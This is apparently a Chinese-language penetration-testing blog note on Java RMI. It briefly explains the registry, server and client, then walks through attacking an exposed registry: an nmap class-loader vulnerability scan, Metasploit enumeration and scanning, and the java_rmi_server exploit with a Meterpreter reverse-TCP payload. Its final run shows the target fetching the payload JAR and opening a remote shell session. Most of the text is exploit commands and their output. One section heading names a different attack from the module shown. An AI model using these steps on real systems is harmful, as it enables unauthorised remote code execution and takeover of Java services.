---
title: Java RMI
category:
- [Kali, Exploit]


tags:
  - 
date: 2020-12-04 20:22:17
top:
updated:
---

`RMI (Java Remote Method Invocation) Java 远程方法调用`，是一种允许一个 JVM 上的 object 调用另一个 JVM 上 object 方法的机制。

RMI 程序通常包括

- `rmi registry` naming service，提供 remote object 注册，name 到 remote object 的绑定和查询，是一种特殊的 remote object
- `rmi server` 创建 remote object，将其注册到 RMI registry
- `rmi client` 通过 name 向 RMI registry 获取 remote object reference (stub)，调用其方法


![java-rmi-1](../images/java-rmi-1.gif)

通常 RMI server 和 registry 运行在同一个 host 的不同端口上

> RMI Registry 默认运行在 1099 端口上
> 
> RMI URL `rmi://hostname:port/remoteObjectName`

## 信息收集
> 误报较高
```zsh
nmap -T4 -Pn -sV -p 11099,36753 --script rmi-vuln-classloader 10.200.19.52
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-26 17:47 CST
Nmap scan report for 10.200.19.52
Host is up (0.066s latency).

PORT      STATE SERVICE  VERSION
11099/tcp open  java-rmi Java RMI
| rmi-vuln-classloader: 
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
|     State: VULNERABLE
|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
|       
|     References:
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb
36753/tcp open  java-rmi Java RMI
| rmi-vuln-classloader: 
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
|     State: VULNERABLE
|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
|       
|     References:
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds
```


## Java RMI接口枚举
```zsh
msf6 auxiliary(gather/java_rmi_registry) > show options

Module options (auxiliary/gather/java_rmi_registry):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.200.19.52     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   11099            yes       The target port (TCP)

msf6 auxiliary(gather/java_rmi_registry) > run
[*] Running module against 10.200.19.52

[*] 10.200.19.52:11099 - Sending RMI Header...
[*] 10.200.19.52:11099 - Listing names in the Registry...
[+] 10.200.19.52:11099 - 1 names found in the Registry
[+] 10.200.19.52:11099 - Name jmxrmi (javax.management.remote.rmi.RMIServerImpl_Stub) found on 10.200.19.52:36753
[*] Auxiliary module execution completed
```

## Java RMI代码执行扫描器
```zsh
msf6 auxiliary(scanner/misc/java_rmi_server) > show options

Module options (auxiliary/scanner/misc/java_rmi_server):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.200.19.52     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    11099            yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/misc/java_rmi_server) > run

[+] 10.200.19.52:11099    - 10.200.19.52:11099 Java RMI Endpoint Detected: Class Loader Enabled
[*] 10.200.19.52:11099    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Java RMI默认配置导致的远程代码执行
```zsh
msf6 exploit(multi/misc/java_rmi_server) > show options

Module options (exploit/multi/misc/java_rmi_server):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
   RHOSTS     192.168.79.28    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      36753            yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  12.12.6.178      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   
msf6 exploit(multi/misc/java_rmi_server) > run

[*] Started reverse TCP handler on 12.12.6.178:4444
[*] 192.168.79.28:36753 - Using URL: http://0.0.0.0:8080/gXZLSG8BnMsa3B5
[*] 192.168.79.28:36753 - Local IP: http://192.168.79.28:8080/gXZLSG8BnMsa3B5
[*] 192.168.79.28:36753 - Server started.
[-] 192.168.79.28:36753 - Exploit failed [unreachable]: RuntimeError The connection was refused by the remote host (192.168.79.28:36753).
[*] 192.168.79.28:36753 - Server stopped.
[*] Exploit completed, but no session was created.

```

## Java RMIConnectionImpl浏览器反序列化提权
```
msf6 exploit(multi/misc/java_rmi_server) > show options

Module options (exploit/multi/misc/java_rmi_server):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
   RHOSTS     10.200.19.52     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      11099            yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  12.12.6.178      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

msf6 exploit(multi/misc/java_rmi_server) > run

[*] Started reverse TCP handler on 12.12.6.178:4444
[*] 10.200.19.52:11099 - Using URL: http://0.0.0.0:8080/oYpjH1vIBWgI4Ua
[*] 10.200.19.52:11099 - Local IP: http://192.168.79.28:8080/oYpjH1vIBWgI4Ua
[*] 10.200.19.52:11099 - Server started.
[*] 10.200.19.52:11099 - Sending RMI Header...
[*] 10.200.19.52:11099 - Sending RMI Call...
[*] 10.200.19.52:11099 - Replied to request for payload JAR
[*] Sending stage (53837 bytes) to 10.200.19.52
[+] Meterpreter sessin 1 opened (192.168.79.28:4444 -> 10.200.19.52:50836) at 2020-11-26 18:31:14 -0800
```
